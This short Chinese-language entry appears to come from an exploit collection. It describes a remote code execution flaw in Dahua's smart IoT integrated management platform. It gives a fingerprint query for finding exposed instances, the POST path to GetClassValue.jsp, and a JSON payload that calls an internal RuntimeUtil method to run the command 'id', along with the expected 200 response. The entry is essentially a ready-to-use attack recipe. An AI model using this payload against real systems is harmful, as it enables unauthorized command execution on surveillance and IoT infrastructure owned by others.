# 大华智能物联综合管理平台GetClassValue远程代码执行漏洞

大华 ｜ 命令执行 ｜ —
- **指纹**：`app="dahua-智能物联综合管理平台"`
- **请求**：`POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1`

**Payload**
```
"data": {
"clazzName": "com.dahua.admin.util.RuntimeUtil",
"methodName": "syncexecReturnInputStream",
"fieldName": ["id"]
```
- **响应特征**：200